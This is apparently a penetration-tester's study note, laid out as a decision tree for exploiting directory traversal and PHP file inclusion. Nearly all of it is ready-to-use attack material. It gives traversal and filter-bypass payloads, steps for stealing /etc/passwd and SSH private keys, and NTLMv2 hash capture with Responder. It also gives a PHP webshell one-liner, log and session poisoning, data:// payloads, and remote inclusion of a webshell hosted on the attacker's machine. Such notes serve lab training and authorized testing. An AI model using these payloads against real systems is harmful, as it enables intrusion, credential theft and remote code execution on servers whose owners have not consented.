# File Inclusion & Traversal, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for directory traversal, LFI, and RFI.

---

### Found a parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`, `doc=`, `view=`)
→ This is the classic LFI/traversal shape. Test it: `?page=../../../../../../../../../etc/passwd`
→ No result or error? Work through the bypass ladder in order:
  1. URL-encoded: `%2e%2e/` (or asymmetric `.%2e/%2e%2e/...`)
  2. Non-recursive filter bypass: `....//....//....//etc/passwd` or `..././..././etc/passwd`, strip `../` from `....//` and you still get `../`; app strips once, not recursively
  3. Double URL-encoding: `%252E%252E%252F` (server decodes once → `%2E%2E%2F`, passes dot/slash check; include decodes again → `../`, traversal succeeds)
→ Parameter name not obvious? Run ffuf to discover hidden params first (see automated scanning below)
→ See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], [[09. Common Web Application Attacks#9.2.4. Advanced LFI/RFI Techniques|FI.2]], [[File Inclusion & Traversal#LFI. Automated Scanning with ffuf|Command Appendix]]

### Traversal confirmed, target is Linux
→ Read `/etc/passwd` to enumerate users, then hunt `~/.ssh/id_rsa` for each disclosed user
→ If found, extract it mechanically, never copy/paste by hand, see [[Secrets & Credentials (Decision Tree)|Secrets & Credentials]]
→ See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]

### Traversal confirmed, target is Windows
→ No direct "read passwd, find key" path on Windows. Check IIS-specific locations: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`
→ Try both `../` and `..\`
→ If a UNC path is accepted, start Responder and request `\\$LocalIP\share\probe` to capture the target's NTLMv2 response
→ See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]

### You have LFI and want to read PHP source (not execute it)
→ Use `php://filter/read=convert.base64-encode/resource=<file>`, then `base64 -d` the response
→ Doesn't need `allow_url_include`, works locally on any LFI
→ High-value targets: `configure`, `config`, `../../../../etc/php/7.4/apache2/php.ini`
→ php.ini read lets you check `allow_url_include` before deciding whether data:// or RFI is viable
→ When the base64 blob is wrapped in HTML, use the grep+sed pipeline to extract it cleanly (see [[File Inclusion & Traversal#LFI, php://filter|Command Appendix]])
→ See [[09. Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2 PHP wrappers]]

### You have LFI and want code execution, not just file reads
→ Check `allow_url_include` via php://filter read of php.ini first, it gates two of the five options
→ **Option 1. GIF magic bytes + file upload**: if there's an upload form, create `GIF8<?php system($_GET['cmd']); ?>` in a `.gif` file, upload it, view page source for the upload path, include it via LFI. No `allow_url_include` needed, the file is already on the server
→ **Option 2. PHP session file poisoning**: get PHPSESSID from browser DevTools, include `/var/lib/php/sessions/sess_PHPSESSID` via LFI, confirm a URL param controls a session field, poison with URL-encoded PHP webshell, then include the session file with `&cmd=`
→ **Option 3. Apache access.log User-Agent poisoning**: include `/var/log/apache2/access.log` via LFI, confirm it's readable, poison User-Agent via Burp Repeater (`<?php system($_GET['cmd']); ?>`), then include the log with `&cmd=`
→ **Option 4, data:// wrapper** (needs `allow_url_include = On`): base64-encode the webshell, URL-encode the base64, pass as `data://text/plain;base64,<ENCODED_PAYLOAD>&cmd=id`. More reliable than the plain `data://text/plain,<?php...>` form
→ **Option 5. RFI** (needs `allow_url_include = On`): host `webShell.php` on your machine with `python3 -m http.server`, include it via `?page=http://PWNIP:8000/webShell.php&cmd=id`
→ See [[09. Common Web Application Attacks#9.2. File Inclusion Vulnerabilities|9.2]], [[09. Common Web Application Attacks#9.2.4. Advanced LFI/RFI Techniques|FI.6]], [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|FI.7 log poisoning]], [[File Inclusion & Traversal|Command Appendix]]

### Suspecting LFI but no obvious file-shaped parameter
→ Automated two-phase approach: (1) fuzz GET parameter names with `burp-parameter-names.txt` + `-fs NOISESIZE` to find hidden params; (2) fuzz the discovered param with `LFI-Jhaddix.txt` + `-fs NOISESIZE` to confirm LFI and find a working payload
→ SecLists wordlists: `/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt` (870 LFI payloads)
→ See [[09. Common Web Application Attacks#9.2.4. Advanced LFI/RFI Techniques|FI.8]], [[File Inclusion & Traversal#LFI. Automated Scanning with ffuf|Command Appendix]]

### Upload form exists alongside an LFI — combining them for RCE
→ Step 1: use php://filter to read the upload handler's source code (find where files land and how they're named)
→ Step 2: if filenames are computed as `md5_file(content)`, pre-compute: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && md5sum shell.php`
→ Step 3: upload the webshell (extension validation often absent even when the form asks for specific types)
→ Step 4: include via LFI with the predicted filename: `?page=./uploads/md5hash`
→ If there's a dot/slash character filter on the include parameter, try double URL-encoding: `%252E%252E%252Fuploads%252Fmd5hash`
→ See [[09. Common Web Application Attacks#9.2.4. Advanced LFI/RFI Techniques|FI.10]], [[File Inclusion & Traversal#LFI. Skills Assessment: Compute Upload Filename|Command Appendix]]
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for transformations
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
